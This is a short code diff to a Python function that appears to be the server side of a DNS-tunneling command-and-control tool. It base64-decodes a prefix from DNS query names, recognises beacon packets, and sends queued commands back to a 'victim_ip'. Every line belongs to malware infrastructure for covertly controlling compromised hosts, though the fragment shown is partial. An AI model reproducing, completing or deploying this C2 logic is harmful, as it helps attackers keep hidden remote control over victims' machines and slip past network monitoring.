@@ -55,10 +55,10 @@ def parse_packet(packet):
         print("print qname:")
         print(get_qname)
         prefix_packet = check_prefix(get_qname)
+        prefix_packet = base64.b64decode(prefix_packet)
         print("print prefix:")
         print(prefix_packet)     
         data_recieved = extract_data(get_qname,prefix_packet)                                # only the data(without prefix)
-        print(prefix_packet)
         if prefix_packet == BEACON:
             
             send_command(victim_ip,vic_sport,get_qname)                 # check if there is a command in the queue and send if there is
